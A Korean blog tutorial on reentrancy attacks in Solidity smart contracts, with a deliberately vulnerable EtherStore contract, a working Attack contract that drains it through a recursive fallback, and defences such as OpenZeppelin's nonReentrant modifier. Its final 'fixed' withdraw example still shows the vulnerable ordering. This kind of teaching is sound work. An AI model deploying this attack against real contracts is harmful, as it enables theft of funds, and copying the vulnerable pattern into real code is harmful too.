---
emoji: 🧢
title: Reentrancy Attack (재진입 공격)?
date: '2021-12-15 02:26:00'
author: 한성원
tags: EVM Reentrancy ReentrancyAttack
categories: SmartContractVulnerabilities
---


# 👋 Reentrancy Attack (재진입 공격)


## 들어가기전
### Fallback 함수?
Fallback 함수는 contract에서 함수를 실행시킬때 함수가 존재하지 않는다면 실행되는 function이다. 
0.6이전 버전에서는 fallback이 ether는 것과 존재하지 않는 함수의 대비책으로 사용되었지만 0.6 이후 버전부터 fallback은 fallback과 receive로 나누어졌다. 0.6부터는 fallback을 사용하지 않고 receive를 통해 이더를 받을 수 있다.

## Reentrancy Attack(재진입 공격)이란?
Reentrancy Attack은 contract A가 하나의 user로써 contract B 에게 transaction을 보낸다. 이때 contract A가 요청에 대한 제어권을 가지게된다. 그렇게 되면 contract A가 보낸 첫번째 요청이 끝나기 전에 다른 함수를 계속해서 호출 할 수 있게된다. 이는 재진입을 ether를 빼올 수 있게 된다.

## Example Code
예시를 하나 보도록 하자! 
첫번째 contract A는 ether를 보관하는 곳
두번째 contract B는 A를 공격하는 contract이다.

그대로 remix를 사용해 테스트해보면 이해가 빠를 것이다!
```solidity

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
    
}
```

```solidity 
contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```
-  <span style="color:grey">출처: https://solidity-by-example.org/hacks/re-entrancy/</span>  

__EtherStore contract__ 를 보면 deposit과 withdraw 함수가 존재한다. 
- deposit 함수를 원하는 만큼의 ether를 보관할 수 있게 해주는 함수이다.
- withdraw 함수는 자신이 보관한 ether를 가져올 수 있는 함수이다. 

__Attack contract__ 에는 attack과 fallback함수가 존재한다.
- attack 함수는 ether 하나를 deposit하고 이후 바로 withdraw 한다
- fallback 함수에는 ether가 1이상 보관되어 있다면 withdraw함수를 다시 부른다.

함수가 호출되는 순서는 다음과 같다
```
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- ...(이후 반복)
```

1. 공격자가 attack 함수를 통해 EtherStore에 1 ether를 deposit한다
2. 이후 EtherStore에 1 ether를 찾겠다고 withdraw 함수를 호출한다.
3. withdraw 함수가 호출되면 attack 함수의 fallback function이 호출된다.(이더를 가져오기 때문에!)
4. 이후 fallback function 안에 있는 withdraw함수를 재호출 하게된다.
5. 이후 3-4 과정이 반복되며 재진입 공격이 성공한다.

이처럼 재진입 공격을 통해 부당한 이득을 취할 수 있게된다.


## Reentrancy Attack(재진입 공격) DAO?
Reentrancy Attack은 DAO


## How to prevent?
그렇다면 reentrency attack은 어떻게 예방 할 수 있을까?

Reentrency attack은 예방하는 방법은 총 2가지로 나눌 수 있다. 
1. openzeppline의 ReentrancyGuard contract의 noReentrant modifier 사용하기
    -  openzeppline Library는 secure smart contract 개발을 위한 Library이다.
    - noReentrant modifier의 코드는 이러하다. 
    ```solidity
        modifier nonReentrant() {
        // On the first call to nonReentrant, _notEntered will be true
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;

        _;

        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }
    ```
    함수 뒤에 noReentrant를 붙혀주는 것으로 쉬게 사용 가능하다.

2. Check-Effects-Interaction 패턴
  -  함수 내에서 interaction이 일어나기 전 check와 effect를 다 적용하는 패턴이다. 위 예제의 withdraw 함수 같은 경우 effect 부분이 interaction 부분 다음에 있는 것을 볼 수 있다. 
  - Check-Effects-Interaction 패턴을 적용하게 되면 interaction하기 전에 먼저 balance에 대한 데이터가 바뀜으로 reentrency하게 되어도 require문에 걸리게 된다.
  

  ```solidity
  function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}(""); // interaction 부분!!
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0; // effect!!
    }
  ```
  
## 마치며
"블록체인은 해킹 당하지 않는다!" 라는 것은 맞는 말이지만 블록체인 위에서 만들어지는 smart contract는 그렇지 않다. 코드를 조금이라도 잘못 짜게되면 Reentrency attack과 많은 취약점들이 생길 수 있다. 그럼으로 앞으로 취약점들에 대해 공부해 smart contract를 만들때 유의하도록 하자!!

```toc

```